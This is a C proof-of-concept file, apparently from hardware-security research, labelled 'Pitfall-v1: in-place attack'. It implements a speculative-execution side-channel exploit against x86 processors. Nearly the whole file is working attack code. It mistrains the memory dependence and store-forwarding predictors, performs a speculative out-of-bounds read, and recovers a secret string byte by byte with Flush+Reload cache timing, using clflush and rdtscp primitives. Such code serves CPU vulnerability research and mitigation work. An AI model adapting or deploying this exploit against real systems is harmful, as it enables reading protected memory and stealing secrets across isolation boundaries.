/* SPDX-License-Identifier: GPL-3.0-only */
/* Copyright (C) 2026 Chang Liu */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/mman.h>


#define CACHE_SHL 9
#define CACHE_ST (1 << CACHE_SHL)
#ifndef SECRET_STRING
#define SECRET_STRING "Pitfall-v1: in-place attack.\0"
#endif

uint64_t cache_state_shreshold;

uint8_t unused1[64];
uint8_t array1[16] = {10,0,0,0,0,0,0,0,0,0,0xee,0,0,0,0,0};
uint8_t unused2[64];
size_t array2[256 * CACHE_ST];
uint8_t unused3[64];

size_t idx;

/********************************************************************
Victim code.
********************************************************************/

char* secret = SECRET_STRING;

uint8_t temp = 0; /* avlid compiler optimization of the victim_function */

void victim_function(size_t x) {
    asm volatile(
        "mov (%0), %%rax\n\t"
        "shl $%c4, %%rax \n\t"
        "add %3, %%rax \n\t"
        "movq %1, (%%rax) \n\t"              // delayed store: array2[idx * CACHE_SET] = x
        "movq (%3), %%rdx \n\t"              // forwardded load: v = array2[0]
        "movzbq (%2, %%rdx, 1), %%rdx \n\t"  // out-of-bound access: s = array1[v]
        "shl $%c4, %%rdx \n\t"
        "mov (%3, %%rdx, 1), %%rax \n\t"     // cache side channel: array2[s * CACHE_ST]
        :
        : "r" (&idx), "r" (x), "r"(array1), "r"(array2), "i" (CACHE_SHL + 3)
        : "rax", "rdx", "rcx", "memory"
    );
}

/********************************************************************
Attacker code.
********************************************************************/
__attribute__((always_inline)) inline void clflush(void* addr) {
    __asm__ volatile("clflush (%0)" :: "r"(addr));
}
__attribute__((always_inline)) inline size_t gettime(void){
    unsigned long low_a, high_a;
    asm volatile("rdtscp"
        : "=a" (low_a), "=d" (high_a)
        : "c" (1));
    unsigned long aval = ((low_a) | (high_a) << 32);
    return aval;
}

uint64_t cache_probe(uint64_t* p) {
    uint64_t t1, t2;
    t1 = gettime();
    asm volatile("movq (%0), %%rax"::"r"(p):"rax");
    t2 = gettime();
    return t2 - t1;
}

static int cmp_uint64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a;
    uint64_t y = *(const uint64_t *)b;
    if (x < y) return -1;
    if (x > y) return 1;
    return 0;
}

uint64_t get_cache_hit_threshold() {
    uint64_t hit[100000];
    uint64_t miss[100000];
    for(int i = 0; i < 100000; ++ i) {
        hit[i] = cache_probe(&array2[0]);
        clflush(&array2[0]);
        for (volatile int z = 0; z < 100; ++ z) {}
        miss[i] = cache_probe(&array2[0]);
    }
    // Quick Sort
    qsort(hit, 100000, sizeof(uint64_t), cmp_uint64);
    qsort(miss, 100000, sizeof(uint64_t), cmp_uint64);
    // Gen threshold
    uint64_t t_hit = 0, t_miss = 0;
    for(int i = 0; i < 90000; ++ i)
        t_hit += hit[i];
    for(int i = 10000; i < 90000; ++ i)
        t_miss += miss[i];
    return t_hit / 90000 + (t_miss / 80000 - t_hit / 90000) / 4 * 3;
}

/* 
 * malicious_x: address of the secret byte - address of the array1 base 
 * value: recovered byte
 * score: evaluation of the recovery
 */
void leak(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
    register uint64_t time;
    int rank_0_idx, rank_1_idx, mix_i;
	for (int i = 0; i < 256; i++)
		results[i] = 0;
	for (int tries = 100; tries > 0; tries--) {
 		
        usleep(0);  // syscall to reset SFP states

        for (int i = 0; i < 256; i++) {
			clflush(&array2[i * CACHE_ST]); // flush cache line
        }
        
        idx = 10;
        for (int i = 0; i <= 16; ++ i) {  // train MDP to predict as Bypassing
            clflush(&idx);
            for (volatile int z = 0; z < 100; ++ z) {}
            victim_function(0);
        }

        idx = 0;
        for (int i = 0; i <= 8; ++ i) {  // train PSFP to predict as Forwarding Store
            clflush(&idx);
            for (volatile int z = 0; z < 100; ++ z) {}
            victim_function(0);
        }

		idx = 10;
		clflush(&idx);
		for (volatile int z = 0; z < 100; ++ z) {}
        victim_function(malicious_x);  // leak secret

        // Flush+Reload
		for (int i = 0; i < 256; i ++) {
			mix_i = ((i * 167) + 13) & 255;
			time = cache_probe(&array2[mix_i * CACHE_ST]);
			if ((int)time <= cache_state_shreshold && mix_i != 10 && mix_i != 0x00)
				results[mix_i]++; // cache hit - add +1 to score for this value
		}

        rank_0_idx = -1, rank_1_idx = -1;
        for (int i = 0; i < 256; i ++) {
            if (rank_0_idx < 0 || results[i] >= results[rank_0_idx]) {
                rank_1_idx = rank_0_idx;
                rank_0_idx = i;
            }
            else if (rank_1_idx < 0 || results[i] >= results[rank_1_idx]) {
                rank_1_idx = i;
            }
        }
        if (results[rank_0_idx] >= (2 * results[rank_1_idx] + 5) 
			|| (results[rank_0_idx] == 3 && results[rank_1_idx] == 0)) {
			break;
		}       
	}

    results[0] ^= temp; // avlid compiler optimization	
	value[0] = (uint8_t)rank_0_idx;
	score[0] = results[rank_0_idx];
	value[1] = (uint8_t)rank_1_idx;
	score[1] = results[rank_1_idx];    
}

int main(int argc, const char* * argv) {

    // hot cpu
    for (size_t i = 0; i < 256 * CACHE_ST; i++) {
        array2[i] = 0;
    }

	cache_state_shreshold = get_cache_hit_threshold();
    printf("cache_state_shreshold = %ld\n", cache_state_shreshold);

    // leak secret
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	size_t malicious_x = (size_t)(secret - (char *)array1);
	int score[2], len = strlen(secret);
	uint8_t value[2];
    printf("Reading %d bytes:\n", len);
	while (--len >= 0) {
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		leak(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
	return (0);
}